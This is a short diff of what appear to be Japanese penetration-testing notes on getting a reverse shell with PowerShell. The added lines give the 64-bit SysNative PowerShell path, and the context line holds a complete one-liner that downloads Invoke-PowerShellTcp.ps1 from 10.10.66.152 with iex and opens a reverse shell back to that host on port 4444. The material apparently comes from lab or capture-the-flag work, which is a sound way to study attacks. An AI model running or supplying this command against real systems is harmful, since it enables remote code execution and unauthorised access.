@@ -710,6 +710,10 @@ Powershell を使って、reverse shell 取得可能
 
 ```
 
+C:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe
+SysNative: 64-bit architecture system binaries are located.
+
+
 powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.66.152:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.66.152 -Port 4444
 
 
